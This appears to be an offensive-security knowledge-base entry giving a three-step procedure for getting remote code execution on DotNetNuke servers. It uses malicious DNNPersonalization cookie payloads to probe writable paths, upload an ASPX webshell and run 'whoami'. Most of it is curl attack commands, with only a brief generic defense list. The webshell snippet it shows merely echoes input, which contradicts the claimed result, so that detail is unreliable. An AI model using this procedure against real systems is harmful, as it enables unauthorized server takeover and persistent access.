---
id: uuid-placeholder-5
tags:
  - webshell
  - rce
  - file-upload
type: procedure
tools:
  - '[[tools/ysoserial.net]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-upload-shell]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:23:54.227Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[Windows Command Shell]]'
---
# Brute Force Writable Paths and Upload Webshell

## Summary

This procedure uses file read payloads to probe writable paths, then uploads an ASPX webshell via CreateFileFromString for RCE.

## Description

Probe directories with read attempts to detect write permissions via errors, then craft payload for shell upload. Targets DNN file system; outcomes include persistent RCE access.

## Requirements

1. List of potential paths (e.g., DNN install dir)
2. Basic ASPX shell code
3. Payload tool

## Defense

Defensive measures and detection strategies:

- Secure file permissions
- Scan for uploaded webshells
- Implement ASPX execution restrictions

## Objectives

1. Identify writable locations
2. Upload functional webshell
3. Achieve RCE

## Instructions

### Step 1: Probe Paths with Read Payloads

**Context**: Test access to infer writability.

**Command** ([[commands/curl-probe-path]]):
```bash
curl -v "https://target.com/nonexistent-page" -H "Cookie: DNNPersonalization=<probe-payload-for-path>"
```

> Iterate paths; errors indicate permissions.

### Step 2: Upload Webshell

**Context**: Use writable path for shell.

**Command** ([[commands/curl-upload-shell]]):
```bash
curl -v "https://target.com/nonexistent-page" -H "Cookie: DNNPersonalization=<upload-payload>"
```

> Payload includes shell code like <%@ Page Language="C#" %><% Response.Write(Request["cmd"]); %>

### Step 3: Verify RCE

**Context**: Access shell.

**Command** ([[commands/curl-execute-shell]]):
```bash
curl "https://target.com/path/shell.aspx?cmd=whoami"
```

> Returns server user.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]
- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-shell]]
- [[commands/curl-execute-shell]]

## Tools Used

- [[tools/ysoserial.net]]

## Tags

- webshell
- rce
